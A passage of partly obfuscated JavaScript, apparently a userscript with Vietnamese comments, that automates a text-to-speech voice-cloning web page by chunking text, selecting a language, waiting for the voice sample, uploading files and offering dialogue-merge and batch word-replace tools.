                                addLogEntry(`❌ [Chunk ${ttuo$y_KhCV + 1}] Lỗi 403: Website đã phát hiện automation. Thử lại sau 5 giây...`, 'error');
                                await new Promise(resolve => setTimeout(resolve, 5000));
                                throw new Error('403 Forbidden - Website detected automation');
                            }
                            throw new Error(ndkpgKnjg(0x241) + FGrxK_RK[ndkpgKnjg(0x237)]);
                        }
                        const qILAV = await FGrxK_RK[ndkpgKnjg(0x26f)]();
                        // Lưu chunk vào đúng vị trí dựa trên ttuo$y_KhCV (chunk index hiện tại)
                        if (typeof window.chunkBlobs === 'undefined') {
                            window.chunkBlobs = new Array(SI$acY.length).fill(null);
                        }

                        // QUAN TRỌNG: Đảm bảo lưu đúng vị trí chunk, không phụ thuộc vào ttuo$y_KhCV
                        const currentChunkIndex = ttuo$y_KhCV;

                        // Đảm bảo window.chunkBlobs có đủ độ dài
                        while (window.chunkBlobs.length <= currentChunkIndex) {
                            window.chunkBlobs.push(null);
                        }
                        window.chunkBlobs[currentChunkIndex] = qILAV;

                        // ĐỒNG BỘ HÓA ZTQj$LF$o: Đảm bảo ZTQj$LF$o cũng có chunk ở đúng vị trí
                        // Nếu ZTQj$LF$o chưa đủ độ dài, mở rộng mảng
                        while (ZTQj$LF$o.length <= currentChunkIndex) {
                            ZTQj$LF$o.push(null);
                        }
                        ZTQj$LF$o[currentChunkIndex] = qILAV;

                        // ĐỒNG BỘ HÓA: Đảm bảo cả hai mảng đều có chunk này ở đúng vị trí
                        addLogEntry(`🔄 Đã lưu chunk ${currentChunkIndex + 1} vào vị trí ${currentChunkIndex} của cả window.chunkBlobs và ZTQj$LF$o`, 'info');

                        // DEBUG: Kiểm tra trạng thái mảng sau khi lưu
                        const chunkStatus = window.chunkBlobs.map((blob, idx) => blob ? 'có' : 'null').join(', ');
                        addLogEntry(`🔍 Trạng thái window.chunkBlobs: [${chunkStatus}]`, 'info');
                    } catch (FBleqcOZcLNC$NKSlfC) {}
                    ttuo$y_KhCV++;
                    setTimeout(uSTZrHUt_IC, -parseInt(0x1) * -parseInt(0x25de) + Math.max(-0x19, -parseInt(0x19)) * -0x18a + Math.trunc(-0x467c));
                    return;
                }
            }
        }
    });

    xlgJHLP$MATDT$kTXWV[VFmk$UVEL(0x264)](Yy_yaGQ$LW, {
        'childList': !![],
        'subtree': !![]
    });
}function rBuqJlBFmwzdZnXtjIL(){const fgUnHA=AP$u_huhInYfTj,ytkOLYJZOEaDOhowaP=document[fgUnHA(0x1cd)](fgUnHA(0x246));ytkOLYJZOEaDOhowaP&&ytkOLYJZOEaDOhowaP[fgUnHA(0x224)](fgUnHA(0x1bc))===fgUnHA(0x1fe)&&KxTOuAJu(ytkOLYJZOEaDOhowaP);}function ZGEvDUSUwgCtRqI(XOH_jolXfrzfb$u){return new Promise(f$o$ehE=>{const XfxSTlMrygLQP$ENoXGlumBRM=DHk$uTvcFuLEMnixYuADkCeA,MvjhInrbVXjKVUruwh=document[XfxSTlMrygLQP$ENoXGlumBRM(0x1cd)](XfxSTlMrygLQP$ENoXGlumBRM(0x254));if(MvjhInrbVXjKVUruwh&&MvjhInrbVXjKVUruwh[XfxSTlMrygLQP$ENoXGlumBRM(0x273)][XfxSTlMrygLQP$ENoXGlumBRM(0x1d4)]()===XOH_jolXfrzfb$u){f$o$ehE(!![]);return;}if(!MvjhInrbVXjKVUruwh){f$o$ehE(![]);return;}const VZYZVbVjefOZtpoGN=[MvjhInrbVXjKVUruwh,MvjhInrbVXjKVUruwh[XfxSTlMrygLQP$ENoXGlumBRM(0x227)],document[XfxSTlMrygLQP$ENoXGlumBRM(0x1cd)](XfxSTlMrygLQP$ENoXGlumBRM(0x22e)),document[XfxSTlMrygLQP$ENoXGlumBRM(0x1cd)](XfxSTlMrygLQP$ENoXGlumBRM(0x268))][XfxSTlMrygLQP$ENoXGlumBRM(0x21d)](Boolean);let VIEdKkRYRVRqqJcvauv$yeqJs=![];for(const aSzLyIxGR$iZOAwaUnO of VZYZVbVjefOZtpoGN){if(KxTOuAJu(aSzLyIxGR$iZOAwaUnO)){VIEdKkRYRVRqqJcvauv$yeqJs=!![];break;}}if(!VIEdKkRYRVRqqJcvauv$yeqJs){f$o$ehE(![]);return;}let iravm_ITtG=Math.ceil(parseInt(0x93c))*0x3+Math.floor(-parseInt(0xb3a))+Math.max(-parseInt(0xde),-0xde)*Math.trunc(parseInt(0x13));const yZNPe_Cff=-0xf73*0x2+Math.floor(-parseInt(0xae3))*parseInt(0x1)+-parseInt(0x14e7)*-0x2;function ZUTCwm$ZO(){const Yh_c_kdQDftCJybILCYnKDHP=XfxSTlMrygLQP$ENoXGlumBRM;iravm_ITtG++;let XLdCvwP_ExUgMYvoF$PgmcYQoDm=null;for(const KhpCpYqdNeshDhzcz$YopPRCnq of[Yh_c_kdQDftCJybILCYnKDHP(0x204),Yh_c_kdQDftCJybILCYnKDHP(0x1e8),Yh_c_kdQDftCJybILCYnKDHP(0x220),Yh_c_kdQDftCJybILCYnKDHP(0x252)]){XLdCvwP_ExUgMYvoF$PgmcYQoDm=document[Yh_c_kdQDftCJybILCYnKDHP(0x1cd)](KhpCpYqdNeshDhzcz$YopPRCnq);if(XLdCvwP_ExUgMYvoF$PgmcYQoDm&&XLdCvwP_ExUgMYvoF$PgmcYQoDm[Yh_c_kdQDftCJybILCYnKDHP(0x213)]>parseInt(0xc0b)*-0x3+parseInt(0x59f)*-0x1+parseInt(0x8)*parseInt(0x538))break;}if(!XLdCvwP_ExUgMYvoF$PgmcYQoDm){iravm_ITtG<yZNPe_Cff?setTimeout(ZUTCwm$ZO,Math.trunc(-parseInt(0x1))*parseInt(0x8b1)+-0x7e9+0x128e):f$o$ehE(![]);return;}let wUar$U_QcohStsk=null;for(const JawipkxmmQvXAvdYtibQwPC of[Yh_c_kdQDftCJybILCYnKDHP(0x272),Yh_c_kdQDftCJybILCYnKDHP(0x1d3),Yh_c_kdQDftCJybILCYnKDHP(0x232),Yh_c_kdQDftCJybILCYnKDHP(0x21c),Yh_c_kdQDftCJybILCYnKDHP(0x222)]){const ndE_dgEnXpLZ=XLdCvwP_ExUgMYvoF$PgmcYQoDm[Yh_c_kdQDftCJybILCYnKDHP(0x207)](JawipkxmmQvXAvdYtibQwPC);for(const dGawOEsCtvghrtIQyMuYTxt of ndE_dgEnXpLZ){if(dGawOEsCtvghrtIQyMuYTxt[Yh_c_kdQDftCJybILCYnKDHP(0x273)][Yh_c_kdQDftCJybILCYnKDHP(0x1d4)]()===XOH_jolXfrzfb$u){wUar$U_QcohStsk=dGawOEsCtvghrtIQyMuYTxt;break;}}if(wUar$U_QcohStsk)break;}if(!wUar$U_QcohStsk){KxTOuAJu(document[Yh_c_kdQDftCJybILCYnKDHP(0x248)]),f$o$ehE(![]);return;}KxTOuAJu(wUar$U_QcohStsk)?setTimeout(()=>{const cpuoogaLGFCVSyyJxT=Yh_c_kdQDftCJybILCYnKDHP,OMvlnOvIVrYj$DdyPN_J=document[cpuoogaLGFCVSyyJxT(0x1cd)](cpuoogaLGFCVSyyJxT(0x254));OMvlnOvIVrYj$DdyPN_J&&OMvlnOvIVrYj$DdyPN_J[cpuoogaLGFCVSyyJxT(0x273)][cpuoogaLGFCVSyyJxT(0x1d4)]()===XOH_jolXfrzfb$u?f$o$ehE(!![]):f$o$ehE(![]);},Math.ceil(-0x5)*0x2ed+Number(-0x2)*parseFloat(-0xdbd)+parseInt(-0xbad)):f$o$ehE(![]);}setTimeout(ZUTCwm$ZO,-0x24d2+-0x5dd+Math.max(-parseInt(0x1),-parseInt(0x1))*-0x2d07);});}async function FqzIBEUdOwBt(Jn_xqilZP,RGKuwuYHgrIIT=Math.trunc(0xf2e)+parseFloat(-parseInt(0x132a))+0x2*parseInt(0x203)){for(let GqZKAua$R$P=-0xadf+-parseInt(0x1dbb)+-0x181*Math.max(-0x1b,-0x1b);GqZKAua$R$P<=RGKuwuYHgrIIT;GqZKAua$R$P++){const L_BWgyzzSdCDgEEDlZXBu=await ZGEvDUSUwgCtRqI(Jn_xqilZP);if(L_BWgyzzSdCDgEEDlZXBu)return!![];GqZKAua$R$P<RGKuwuYHgrIIT&&await new Promise(Kl_QYkE$QY=>setTimeout(Kl_QYkE$QY,parseInt(0x49)*Math.trunc(0x35)+-parseInt(0x966)+0x1*Math.ceil(0x219)));}return![];}function AMoS$rCm_VoQjhXaWua(){const EOSqNtA$IANphiFD=AP$u_huhInYfTj,dmVumXDOp_nMXAtgodQ=document[EOSqNtA$IANphiFD(0x1cd)](EOSqNtA$IANphiFD(0x210));if(dmVumXDOp_nMXAtgodQ){const wvqk$t=dmVumXDOp_nMXAtgodQ[EOSqNtA$IANphiFD(0x1cd)](EOSqNtA$IANphiFD(0x1f7));if(wvqk$t&&!wvqk$t[EOSqNtA$IANphiFD(0x221)])dmVumXDOp_nMXAtgodQ[EOSqNtA$IANphiFD(0x1bd)]();}}function iDQh_nSiOgsDLmvTjcMSSdUwBv(acdMRck){const BgkEiDtfuwpVhu=AP$u_huhInYfTj,gl_lA_GFvtWJu=document[BgkEiDtfuwpVhu(0x207)](BgkEiDtfuwpVhu(0x1f3));for(const iTilPnjRKvhmFKI$iUCuXlnI of gl_lA_GFvtWJu){if(iTilPnjRKvhmFKI$iUCuXlnI[BgkEiDtfuwpVhu(0x273)]&&iTilPnjRKvhmFKI$iUCuXlnI[BgkEiDtfuwpVhu(0x273)][BgkEiDtfuwpVhu(0x1d4)]()[BgkEiDtfuwpVhu(0x20e)](acdMRck)){const utDJyOyXyOqpqxwzxcVx=iTilPnjRKvhmFKI$iUCuXlnI[BgkEiDtfuwpVhu(0x249)](BgkEiDtfuwpVhu(0x1f9));if(utDJyOyXyOqpqxwzxcVx){const DLOMspx=utDJyOyXyOqpqxwzxcVx[BgkEiDtfuwpVhu(0x1cd)](BgkEiDtfuwpVhu(0x25e));if(DLOMspx){DLOMspx[BgkEiDtfuwpVhu(0x1bd)]();break;}}}}}/**
 * Hàm mới: Chờ cho đến khi giọng mẫu trên web được tải xong.
 * Nó sẽ theo dõi sự biến mất của biểu tượng loading.
 * @returns {Promise<boolean>} Trả về true nếu thành công, false nếu quá thời gian.
 */
async function waitForVoiceModelReady() {
    const VCAHyXsrERcpXVhFPxmgdBjjh = AP$u_huhInYfTj; // Tái sử dụng biến obfuscated có sẵn
    addLogEntry('⏳ Đang chờ website tải xong giọng mẫu...', 'info');

    return new Promise((resolve) => {
        const timeout = setTimeout(() => {
            addLogEntry('❌ Lỗi: Chờ giọng mẫu quá 60 giây. Vui lòng thử lại.', 'error');
            observer.disconnect();
            resolve(false);
        }, 60000); // Thời gian chờ tối đa 60 giây

        const observer = new MutationObserver((mutations, obs) => {
            // Mục tiêu là phần tử loading có class '.ant-spin-spinning' trong khu vực clone voice
            const loadingSpinner = document.querySelector('.clone-voice-ux-v2 .ant-spin-spinning');

            if (!loadingSpinner) {
                addLogEntry('✅ Giọng mẫu đã sẵn sàng!', 'success');
                clearTimeout(timeout);
                obs.disconnect();
                resolve(true);
            }
        });

        const targetNode = document.body;
        const config = { childList: true, subtree: true };
        observer.observe(targetNode, config);

        // Kiểm tra ngay lần đầu tiên, phòng trường hợp nó đã load xong trước khi observer kịp chạy
        if (!document.querySelector('.clone-voice-ux-v2 .ant-spin-spinning')) {
             addLogEntry('✅ Giọng mẫu đã sẵn sàng! (nhanh)', 'success');
             clearTimeout(timeout);
             observer.disconnect();
             resolve(true);
        }
    });
}async function wfxQyKsZ_OULEUwIDIN$OYr(RWknJOoz_W = AP$u_huhInYfTj(0x244)) {
    const zhNYCpNXjHI$uIlV$EIyWTuvKX = AP$u_huhInYfTj;
    const hHnnogfbz$hHkQnbAxKfoWPG = X$tXvLZ => new Promise(aEp_jNC$s => setTimeout(aEp_jNC$s, X$tXvLZ));

    // Bắt đầu quá trình chọn ngôn ngữ trên UI của web
    rBuqJlBFmwzdZnXtjIL();
    await hHnnogfbz$hHkQnbAxKfoWPG(500); // Chờ 0.5s để UI mở ra

    // Chọn ngôn ngữ được chỉ định
    const languageSelected = await FqzIBEUdOwBt(RWknJOoz_W);
    if (!languageSelected) {
        addLogEntry('❌ Lỗi: Không thể chọn ngôn ngữ.', 'error');
        return false; // Dừng nếu không chọn được ngôn ngữ
    }
     addLogEntry(`🗣️ Đã chọn ngôn ngữ: ${RWknJOoz_W}.`, 'info');


    // ---- THAY ĐỔI QUAN TRỌNG NHẤT ----
    // Gọi hàm mới để chờ giọng mẫu load xong, thay vì dùng setTimeout cố định
    const voiceModelReady = await waitForVoiceModelReady();
    if (!voiceModelReady) {
        // Nếu hàm trả về false (bị timeout), dừng quá trình cấu hình
        return false;
    }
    // ------------------------------------

    // Các bước dọn dẹp và xác nhận cuối cùng
    await hHnnogfbz$hHkQnbAxKfoWPG(500); // Chờ 0.5s để UI ổn định
    iDQh_nSiOgsDLmvTjcMSSdUwBv(zhNYCpNXjHI$uIlV$EIyWTuvKX(0x21b)); // Đóng popup nếu có
    await hHnnogfbz$hHkQnbAxKfoWPG(500);
    AMoS$rCm_VoQjhXaWua(); // Dọn dẹp thêm

    // Trả về kết quả cuối cùng
    return true; // Trả về true vì đã qua được bước chờ giọng mẫu
}function u_In_Taeyb(ha_vkXztSqPwoX_qmQKlcp){const scdrpb$_nwRMQXvVJ=AP$u_huhInYfTj,TJ_txTK=document[scdrpb$_nwRMQXvVJ(0x1cd)](scdrpb$_nwRMQXvVJ(0x26d));if(!TJ_txTK)return![];try{const pIzqjC$SSlBxLJPDufXHf_hTwNG=new DataTransfer();for(const q$$rNffLZXQHBKXbsZBb of ha_vkXztSqPwoX_qmQKlcp)pIzqjC$SSlBxLJPDufXHf_hTwNG[scdrpb$_nwRMQXvVJ(0x1e5)][scdrpb$_nwRMQXvVJ(0x203)](q$$rNffLZXQHBKXbsZBb);return TJ_txTK[scdrpb$_nwRMQXvVJ(0x208)]=pIzqjC$SSlBxLJPDufXHf_hTwNG[scdrpb$_nwRMQXvVJ(0x208)],TJ_txTK[scdrpb$_nwRMQXvVJ(0x1c1)](new Event(scdrpb$_nwRMQXvVJ(0x1d7),{'bubbles':!![]})),!![];}catch(tnv$KWVWNV){return![];}}WRVxYBSrPsjcqQs_bXI[AP$u_huhInYfTj(0x25f)](AP$u_huhInYfTj(0x229),()=>{const bISsk$DCGLNjOv=AP$u_huhInYfTj,LvLmlCAo_vy_AFJk=WRVxYBSrPsjcqQs_bXI[bISsk$DCGLNjOv(0x24c)];CVjXA$H[bISsk$DCGLNjOv(0x1c7)]=bISsk$DCGLNjOv(0x20f)+LvLmlCAo_vy_AFJk[bISsk$DCGLNjOv(0x216)]+bISsk$DCGLNjOv(0x1ff)+LvLmlCAo_vy_AFJk[bISsk$DCGLNjOv(0x1d4)]()[bISsk$DCGLNjOv(0x1ed)](/\s+/)[bISsk$DCGLNjOv(0x21d)](Boolean)[bISsk$DCGLNjOv(0x216)]+bISsk$DCGLNjOv(0x1fc)+LvLmlCAo_vy_AFJk[bISsk$DCGLNjOv(0x1ed)](/[.!?。！？]+/)[bISsk$DCGLNjOv(0x21d)](Boolean)[bISsk$DCGLNjOv(0x216)]+bISsk$DCGLNjOv(0x23b)+LvLmlCAo_vy_AFJk[bISsk$DCGLNjOv(0x1d4)]()[bISsk$DCGLNjOv(0x1ed)](/\n+/)[bISsk$DCGLNjOv(0x21d)](Boolean)[bISsk$DCGLNjOv(0x216)]+bISsk$DCGLNjOv(0x1f4);}),yU_jfkzmffcnGgLWrq[AP$u_huhInYfTj(0x25f)](AP$u_huhInYfTj(0x1bd),async()=>{const t$_EKwXXWYJwVOu=AP$u_huhInYfTj;if(PcLAEW[t$_EKwXXWYJwVOu(0x208)][t$_EKwXXWYJwVOu(0x216)]===0x16e0+-0x1573+-parseInt(0x49)*0x5){Swal[t$_EKwXXWYJwVOu(0x26b)]({'icon':t$_EKwXXWYJwVOu(0x212),'title':t$_EKwXXWYJwVOu(0x266),'text':t$_EKwXXWYJwVOu(0x200)});return;}const pP$elepNWoiOEswuBl$wWpWgE=VcTcfGnbfWZdhQRvBp$emAVjf[t$_EKwXXWYJwVOu(0x24c)];yU_jfkzmffcnGgLWrq[t$_EKwXXWYJwVOu(0x243)]=!![],TUlYLVXXZeP_OexmGXTd[t$_EKwXXWYJwVOu(0x273)]=t$_EKwXXWYJwVOu(0x1d0),TUlYLVXXZeP_OexmGXTd[t$_EKwXXWYJwVOu(0x1fb)][t$_EKwXXWYJwVOu(0x26e)]=t$_EKwXXWYJwVOu(0x22f);if(u_In_Taeyb(PcLAEW[t$_EKwXXWYJwVOu(0x208)])){await new Promise(YoMwltQiCl_gqyp=>setTimeout(YoMwltQiCl_gqyp,Math.floor(-0xbf0)*Math.floor(parseInt(0x1))+parseFloat(-parseInt(0x952))+parseFloat(parseInt(0x192a)))),TUlYLVXXZeP_OexmGXTd[t$_EKwXXWYJwVOu(0x273)]=t$_EKwXXWYJwVOu(0x267);const lYBfNBUXykQSrYdLWRfJs=await wfxQyKsZ_OULEUwIDIN$OYr(pP$elepNWoiOEswuBl$wWpWgE);lYBfNBUXykQSrYdLWRfJs?(TUlYLVXXZeP_OexmGXTd[t$_EKwXXWYJwVOu(0x273)]=t$_EKwXXWYJwVOu(0x22b)+pP$elepNWoiOEswuBl$wWpWgE+'.',TUlYLVXXZeP_OexmGXTd[t$_EKwXXWYJwVOu(0x1fb)][t$_EKwXXWYJwVOu(0x26e)]=t$_EKwXXWYJwVOu(0x228)):(TUlYLVXXZeP_OexmGXTd[t$_EKwXXWYJwVOu(0x273)]=t$_EKwXXWYJwVOu(0x247)+pP$elepNWoiOEswuBl$wWpWgE+'.',TUlYLVXXZeP_OexmGXTd[t$_EKwXXWYJwVOu(0x1fb)][t$_EKwXXWYJwVOu(0x26e)]=t$_EKwXXWYJwVOu(0x1e6)),LrkOcBYz_$AGjPqXLWnyiATpCI[t$_EKwXXWYJwVOu(0x243)]=![];}else TUlYLVXXZeP_OexmGXTd[t$_EKwXXWYJwVOu(0x273)]=t$_EKwXXWYJwVOu(0x259),TUlYLVXXZeP_OexmGXTd[t$_EKwXXWYJwVOu(0x1fb)][t$_EKwXXWYJwVOu(0x26e)]=t$_EKwXXWYJwVOu(0x1e6);yU_jfkzmffcnGgLWrq[t$_EKwXXWYJwVOu(0x243)]=![];}),LrkOcBYz_$AGjPqXLWnyiATpCI[AP$u_huhInYfTj(0x25f)](AP$u_huhInYfTj(0x1bd),()=>{const muOPzQltrb_ezJpe_MNI=AP$u_huhInYfTj;if(EfNjYNYj_O_CGB)return;const EFBSgoVbWWlkmceHpywAdxhpn=WRVxYBSrPsjcqQs_bXI[muOPzQltrb_ezJpe_MNI(0x24c)][muOPzQltrb_ezJpe_MNI(0x1d4)]();if(!EFBSgoVbWWlkmceHpywAdxhpn){Swal[muOPzQltrb_ezJpe_MNI(0x26b)]({'icon':muOPzQltrb_ezJpe_MNI(0x212),'title':muOPzQltrb_ezJpe_MNI(0x266),'text':muOPzQltrb_ezJpe_MNI(0x202)});return;}dqj_t_Mr=new Date(),zQizakWdLEdLjtenmCbNC[muOPzQltrb_ezJpe_MNI(0x1fb)][muOPzQltrb_ezJpe_MNI(0x1e1)]=muOPzQltrb_ezJpe_MNI(0x209),document[muOPzQltrb_ezJpe_MNI(0x1de)](muOPzQltrb_ezJpe_MNI(0x225))[muOPzQltrb_ezJpe_MNI(0x1fb)][muOPzQltrb_ezJpe_MNI(0x1e1)]=muOPzQltrb_ezJpe_MNI(0x209),pT$bOHGEGbXDSpcuLWAq_yMVf[muOPzQltrb_ezJpe_MNI(0x1fb)][muOPzQltrb_ezJpe_MNI(0x1e1)]=muOPzQltrb_ezJpe_MNI(0x258),cHjV$QkAT$JWlL[muOPzQltrb_ezJpe_MNI(0x273)]='';if(n_WwsStaC$jzsWjOIjRqedTG)n_WwsStaC$jzsWjOIjRqedTG[muOPzQltrb_ezJpe_MNI(0x1cc)]();ZTQj$LF$o=[],SI$acY=NrfPVBbJv_Dph$tazCpJ(EFBSgoVbWWlkmceHpywAdxhpn),ttuo$y_KhCV=0x6*Math.floor(-parseInt(0x26))+-0x1c45+Math.ceil(parseInt(0x1d29)),EfNjYNYj_O_CGB=!![],MEpJezGZUsmpZdAgFRBRZW=![],LrkOcBYz_$AGjPqXLWnyiATpCI[muOPzQltrb_ezJpe_MNI(0x1fb)][muOPzQltrb_ezJpe_MNI(0x1e1)]=muOPzQltrb_ezJpe_MNI(0x209),lraDK$WDOgsXHRO[muOPzQltrb_ezJpe_MNI(0x1fb)][muOPzQltrb_ezJpe_MNI(0x1e1)]=muOPzQltrb_ezJpe_MNI(0x258),OdKzziXLxtOGjvaBMHm[muOPzQltrb_ezJpe_MNI(0x1fb)][muOPzQltrb_ezJpe_MNI(0x1e1)]=muOPzQltrb_ezJpe_MNI(0x258),lraDK$WDOgsXHRO[muOPzQltrb_ezJpe_MNI(0x273)]=muOPzQltrb_ezJpe_MNI(0x239),uSTZrHUt_IC();}),lraDK$WDOgsXHRO[AP$u_huhInYfTj(0x25f)](AP$u_huhInYfTj(0x1bd),()=>{const AuzopbHlRPCFBPQqnHMs=AP$u_huhInYfTj;MEpJezGZUsmpZdAgFRBRZW=!MEpJezGZUsmpZdAgFRBRZW,lraDK$WDOgsXHRO[AuzopbHlRPCFBPQqnHMs(0x273)]=MEpJezGZUsmpZdAgFRBRZW?AuzopbHlRPCFBPQqnHMs(0x271):AuzopbHlRPCFBPQqnHMs(0x239);if(!MEpJezGZUsmpZdAgFRBRZW)uSTZrHUt_IC();}),OdKzziXLxtOGjvaBMHm[AP$u_huhInYfTj(0x25f)](AP$u_huhInYfTj(0x1bd),()=>{const jWtMo=AP$u_huhInYfTj;EfNjYNYj_O_CGB=![],MEpJezGZUsmpZdAgFRBRZW=![];if(xlgJHLP$MATDT$kTXWV)xlgJHLP$MATDT$kTXWV[jWtMo(0x24e)]();if(Srnj$swt)clearTimeout(Srnj$swt);ZTQj$LF$o=[],SI$acY=[],WRVxYBSrPsjcqQs_bXI[jWtMo(0x24c)]='',rUxbIRagbBVychZ$GfsogD[jWtMo(0x24c)]='',pT$bOHGEGbXDSpcuLWAq_yMVf[jWtMo(0x1fb)][jWtMo(0x1e1)]=jWtMo(0x209),zQizakWdLEdLjtenmCbNC[jWtMo(0x1fb)][jWtMo(0x1e1)]=jWtMo(0x209);if(n_WwsStaC$jzsWjOIjRqedTG)n_WwsStaC$jzsWjOIjRqedTG[jWtMo(0x1cc)]();LrkOcBYz_$AGjPqXLWnyiATpCI[jWtMo(0x1fb)][jWtMo(0x1e1)]=jWtMo(0x258),lraDK$WDOgsXHRO[jWtMo(0x1fb)][jWtMo(0x1e1)]=jWtMo(0x209),OdKzziXLxtOGjvaBMHm[jWtMo(0x1fb)][jWtMo(0x1e1)]=jWtMo(0x209),LrkOcBYz_$AGjPqXLWnyiATpCI[jWtMo(0x243)]=![],LrkOcBYz_$AGjPqXLWnyiATpCI[jWtMo(0x273)]=jWtMo(0x275);}),XvyPnqSRdJtYjSxingI[AP$u_huhInYfTj(0x25f)](AP$u_huhInYfTj(0x1bd),()=>{const XhOmEQytvnK$v=AP$u_huhInYfTj;if(n_WwsStaC$jzsWjOIjRqedTG)n_WwsStaC$jzsWjOIjRqedTG[XhOmEQytvnK$v(0x21a)]();});

        // --- START: NEW FUNCTIONALITY ---

        // Get references to new elements
        const mergeBtn = document.getElementById('gemini-merge-btn');
        const mainTextareaForNewFunc = document.getElementById('gemini-main-textarea');
        const pairsContainer = document.getElementById('batch-replace-pairs');
        const addPairBtn = document.getElementById('add-replace-pair-btn');
        const executeReplaceBtn = document.getElementById('execute-replace-btn');

        // --- 1. Merge Dialogue Functionality ---
        if (mergeBtn && mainTextareaForNewFunc) {
            mergeBtn.addEventListener('click', () => {
                const text = mainTextareaForNewFunc.value;
                if (!text) return;

                const lines = text.split('\n')
                    .map(line => line.trim())
                    .filter(line => line.length > 0);

                if (lines.length <= 1) return;

                let result = lines.map((line, index) => {
                    if (index < lines.length - 1) { // Not the last line
                        if (!/[.,?!:;]$/.test(line)) {
                            return line + ',';
                        }
                    } else { // The very last line
                        if (!/[.?!]$/.test(line)) {
                            if (line.endsWith(',')) {
                                return line.slice(0, -1) + '.';
                            }
                            return line + '.';
                        }
                    }
                    return line;
                }).join(' ');

                mainTextareaForNewFunc.value = result;
                mainTextareaForNewFunc.dispatchEvent(new Event('input', { 'bubbles': true }));
            });
        }


        // --- 2. Batch Replace Functionality ---
        if (pairsContainer && addPairBtn && executeReplaceBtn && mainTextareaForNewFunc) {
            const STORAGE_KEY = 'DUC_LOI_REPLACE_PAIRS_V2';
            const SETTINGS_KEY = 'DUC_LOI_REPLACE_SETTINGS_V1';

            // Tạo container cho tùy chọn thay thế
            const replaceOptionsContainer = document.createElement('div');
            replaceOptionsContainer.className = 'replace-options-container';
            replaceOptionsContainer.style.cssText = `
                margin-bottom: 15px;
                padding: 10px;
                background: linear-gradient(135deg, #44475a 0%, #2d3748 100%);
                border: 1px solid rgba(98, 114, 164, 0.3);
                border-radius: 8px;
            `;
            replaceOptionsContainer.innerHTML = `
                <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
                    <label style="color: #f8f8f2; font-weight: bold; font-size: 14px;">Cách thay thế:</label>
                    <label style="display: flex; align-items: center; gap: 5px; color: #f8f8f2; cursor: pointer;">
                        <input type="radio" name="replace-mode" value="word" id="replace-word-mode" checked>
                        <span>Thay thế theo từ</span>
                    </label>
                    <label style="display: flex; align-items: center; gap: 5px; color: #f8f8f2; cursor: pointer;">
                        <input type="radio" name="replace-mode" value="string" id="replace-string-mode">
                        <span>Thay thế theo ký tự</span>
                    </label>
                </div>
                <div style="margin-top: 8px; font-size: 12px; color: #94a3b8;">
                    <span id="replace-mode-description">Thay thế chỉ khi là từ hoàn chỉnh (ví dụ: "anh" → "em" nhưng "thanh" không đổi)</span>
                </div>
            `;

            // Chèn tùy chọn vào trước pairsContainer
            pairsContainer.parentNode.insertBefore(replaceOptionsContainer, pairsContainer);

            // Lấy các element tùy chọn
            const wordModeRadio = document.getElementById('replace-word-mode');
            const stringModeRadio = document.getElementById('replace-string-mode');
            const modeDescription = document.getElementById('replace-mode-description');

            // Lưu cài đặt
            const saveSettings = () => {
                const settings = {
                    replaceMode: wordModeRadio.checked ? 'word' : 'string'
                };
                localStorage.setItem(SETTINGS_KEY, JSON.stringify(settings));
            };

            // Tải cài đặt
            const loadSettings = () => {
                const savedSettings = localStorage.getItem(SETTINGS_KEY);
                if (savedSettings) {
                    try {
                        const settings = JSON.parse(savedSettings);
                        if (settings.replaceMode === 'word') {
                            wordModeRadio.checked = true;
                        } else {
                            stringModeRadio.checked = true;
                        }
                        updateModeDescription();
                    } catch (e) {
                        console.error("Lỗi khi tải cài đặt thay thế:", e);
                    }
                }
            };

            // Cập nhật mô tả
            const updateModeDescription = () => {
                if (wordModeRadio.checked) {
                    modeDescription.textContent = 'Thay thế chỉ khi là từ hoàn chỉnh (ví dụ: "anh" → "em" nhưng "thanh" không đổi)';
                } else {
                    modeDescription.textContent = 'Thay thế tất cả chuỗi tìm thấy (ví dụ: "anh" → "em" trong cả "thanh")';
                }
            };

            // Event listeners cho radio buttons
            wordModeRadio.addEventListener('change', () => {
                updateModeDescription();
                saveSettings();
            });
            stringModeRadio.addEventListener('change', () => {
                updateModeDescription();
                saveSettings();
            });

            const savePairs = () => {
                const pairs = [];
                pairsContainer.querySelectorAll('.replace-pair-row').forEach(row => {
                    const findInput = row.querySelector('.find-input');
                    const replaceInput = row.querySelector('.replace-input');
                    if (findInput.value || replaceInput.value) {
                        pairs.push({ find: findInput.value, replace: replaceInput.value });
                    }
                });
                localStorage.setItem(STORAGE_KEY, JSON.stringify(pairs));
            };

            const addPairRow = (findVal = '', replaceVal = '') => {
                const row = document.createElement('div');
                row.className = 'replace-pair-row';
                const escapedFindVal = findVal.replace(/"/g, '&quot;');
                const escapedReplaceVal = replaceVal.replace(/"/g, '&quot;');
                row.innerHTML = `
                    <input type="text" class="find-input" placeholder="Từ cần đổi" value="${escapedFindVal}">
                    <input type="text" class="replace-input" placeholder="Từ thay thế" value="${escapedReplaceVal}">
                    <button class="remove-pair-btn" title="Xóa cặp từ">×</button>
                `;

                row.querySelector('.remove-pair-btn').addEventListener('click', () => {
                    row.remove();
                    savePairs();
                });

                row.querySelectorAll('input').forEach(input => {
                    input.addEventListener('input', savePairs);
                });

                pairsContainer.appendChild(row);
            };

            const loadPairs = () => {
                const savedPairs = localStorage.getItem(STORAGE_KEY);
                if (savedPairs) {
                    try {
                        const pairs = JSON.parse(savedPairs);
                        if (Array.isArray(pairs)) {
                            pairs.forEach(pair => addPairRow(pair.find, pair.replace));
                        }
                    } catch (e) {
                        console.error("Lỗi khi tải cặp từ đã lưu:", e);
                        localStorage.removeItem(STORAGE_KEY);
                    }
                }
            };

            addPairBtn.addEventListener('click', () => {
                addPairRow();
                const lastRow = pairsContainer.querySelector('.replace-pair-row:last-child');
                if (lastRow) {
                    lastRow.querySelector('.find-input').focus();
                }
            });

            executeReplaceBtn.addEventListener('click', () => {
                let currentText = mainTextareaForNewFunc.value;
                if (!currentText) return;

                const pairsToReplace = [];
                pairsContainer.querySelectorAll('.replace-pair-row').forEach(row => {
                     const findVal = row.querySelector('.find-input').value;
                     const replaceVal = row.querySelector('.replace-input').value;
                     if(findVal) {
                         pairsToReplace.push({find: findVal, replace: replaceVal});
                     }
                });

                const isWordMode = wordModeRadio.checked;

                for(const pair of pairsToReplace) {
                     let escapedFindVal = pair.find.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

                     // Nếu là chế độ thay thế theo từ, thêm word boundary
                     if (isWordMode) {
                         escapedFindVal = '\\b' + escapedFindVal + '\\b';
                     }

